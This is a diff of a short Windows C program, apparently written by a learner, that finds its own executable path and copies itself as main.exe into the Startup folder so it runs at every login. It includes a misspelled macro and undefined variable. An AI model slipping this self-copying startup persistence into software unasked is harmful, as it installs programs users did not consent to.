@@ -18,19 +18,27 @@ int main() {
     // we finded the startup 
     //and we going to  find the where are we?
     DWORD result2 = GetModuleFileNameW(NULL, exePath, MAX_PATH);
-    /*GetModuleFileNameW for windows api . to find the what we are (path and name)
-      exePath for the address .
-      The maxpath for limit is 260 characters
-    */
-    if (CopyFile(exePath, appPath, FALSE)) {
-        printf("We did it ");
-    } else {
-        printf("We didn't succeed  ");
+    if (SUCCEDED(result1)) {
+        lstrcatW(appPath, L"\\main.exe");
+
+        /*GetModuleFileNameW for windows api . to find the what we are (path and name)
+        exePath for the address .
+        The maxpath for limit is 260 characters
+        */
+        if (CopyFileW(exePath, appPath, FALSE)) {
+            printf("We did it ");
+        } else {
+            printf("We didn't succeed  ");
+        }
+        /*
+        CopyFile is windows api
+        exePath the path of  exe path 
+        appPath for startup adress 
+        false for overwrite . 
+        */
     }
-    /*
-    CopyFile is windows api
-    exePath the path of  exe path 
-    appPath for startup adress 
-    false for overwrite . 
-    */
+    //how ı can forgot....
+    return 0;
+
+ 
 }    
